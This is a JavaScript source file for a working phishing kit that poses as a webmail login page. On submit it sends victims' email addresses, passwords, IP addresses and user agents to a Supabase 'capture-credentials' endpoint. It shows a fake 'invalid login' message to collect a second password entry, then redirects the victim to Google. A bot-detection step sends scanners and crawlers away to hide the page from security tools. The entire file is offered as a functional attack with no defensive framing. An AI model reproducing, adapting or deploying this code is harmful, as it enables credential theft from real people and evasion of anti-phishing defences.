// Configuration - these will be set via environment variables in production
const SUPABASE_CONFIG = {
    url: import.meta.env.VITE_SUPABASE_URL || 'your-supabase-url',
    anonKey: import.meta.env.VITE_SUPABASE_ANON_KEY || 'your-supabase-anon-key'
};

class PhishingKit {
    constructor() {
        this.attempt = this.getAttemptNumber();
        this.userIP = null;
        this.userAgent = navigator.userAgent;
        this.country = null;
        this.sessionId = this.getOrCreateSessionId();
        this.isBlocked = false;
    }

    async init() {
        await this.getUserIP();
        await this.runBotProtection();
        if (!this.isBlocked) {
            this.setupFormHandlers();
        }
    }

    getOrCreateSessionId() {
        let sessionId = localStorage.getItem('phishing_session_id');
        if (!sessionId) {
            sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('phishing_session_id', sessionId);
        }
        return sessionId;
    }

    async getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            this.userIP = data.ip;
        } catch (error) {
            console.log('IP detection failed, using fallback');
            this.userIP = '127.0.0.1';
        }
    }

    async runBotProtection() {
        try {
            const response = await fetch(`${SUPABASE_CONFIG.url}/functions/v1/bot-protection`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${SUPABASE_CONFIG.anonKey}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ip: this.userIP,
                    userAgent: this.userAgent
                })
            });

            if (response.ok) {
                const result = await response.json();
                this.country = result.country;
                
                if (result.isBot) {
                    this.blockUser(result.reason);
                    return;
                }
            }

            // Log legitimate visit
            await this.logVisit();
        } catch (error) {
            console.error('Bot protection failed:', error);
            // Continue anyway if bot protection fails
            this.country = 'Unknown';
            await this.logVisit();
        }
    }

    blockUser(reason) {
        console.log(`Bot blocked: ${reason}`);
        this.isBlocked = true;
        setTimeout(() => {
            window.location.href = 'https://google.com';
        }, 1000);
    }

    async logVisit() {
        // Visit logging could be implemented as another edge function if needed
        console.log(`Visit logged: ${this.userIP} from ${this.country}`);
    }

    getAttemptNumber() {
        const currentPage = window.location.pathname;
        if (currentPage.includes('login33') || localStorage.getItem('firstAttempt')) {
            return 2;
        }
        return 1;
    }

    setupFormHandlers() {
        const form = document.getElementById('login_form');
        if (!form) return;

        form.addEventListener('submit', (e) => this.handleFormSubmit(e));
    }

    async handleFormSubmit(e) {
        e.preventDefault();
        
        const formData = new FormData(e.target);
        const credentials = {
            email: formData.get('user'),
            password: formData.get('pass'),
            attempt: this.attempt,
            sessionId: this.sessionId,
            ip: this.userIP,
            userAgent: this.userAgent,
            country: this.country
        };

        if (!credentials.email || !credentials.password) {
            return;
        }

        // Send credentials to Supabase Edge Function
        await this.logCredentials(credentials);

        if (this.attempt === 1) {
            // Store first attempt and show invalid login
            localStorage.setItem('firstAttempt', JSON.stringify(credentials));
            this.showInvalidLogin();
        } else {
            // Second attempt - clear storage and redirect
            localStorage.removeItem('firstAttempt');
            localStorage.removeItem('phishing_session_id');
            this.redirectToFinal();
        }
    }

    async logCredentials(credentials) {
        try {
            console.log('Sending credentials to Supabase:', credentials)
            
            const response = await fetch(`${SUPABASE_CONFIG.url}/functions/v1/capture-credentials`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${SUPABASE_CONFIG.anonKey}`,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(credentials)
            });

            if (response.ok) {
                const result = await response.json()
                console.log('Credentials logged successfully');
                console.log('Response:', result)
            } else {
                const errorText = await response.text()
                console.error('Failed to log credentials:', response.status, errorText)
            }
        } catch (error) {
            console.error('Failed to send credentials:', error);
        }
    }

    showInvalidLogin() {
        // Show error message
        const loginStatus = document.getElementById('login-status');
        const loginMessage = document.getElementById('login-status-message');
        
        if (loginStatus && loginMessage) {
            loginMessage.textContent = 'The login is invalid.';
            loginStatus.style.visibility = 'visible';
            loginStatus.style.opacity = '1';
        }

        // Clear form fields
        document.getElementById('user').value = '';
        document.getElementById('pass').value = '';
        
        // Focus on email field
        document.getElementById('user').focus();
    }

    redirectToFinal() {
        // Show success message briefly
        const loginStatus = document.getElementById('login-status');
        const loginMessage = document.getElementById('login-status-message');
        
        if (loginStatus && loginMessage) {
            loginMessage.textContent = 'Redirecting to your email...';
            loginStatus.style.visibility = 'visible';
            loginStatus.style.opacity = '1';
        }

        // Redirect after 2 seconds
        setTimeout(() => {
            window.location.href = 'https://google.com';
        }, 2000);
    }
}

// Initialize when page loads
document.addEventListener('DOMContentLoaded', async function() {
    console.log('Webmail login page loaded');
    
    const kit = new PhishingKit();
    await kit.init();
});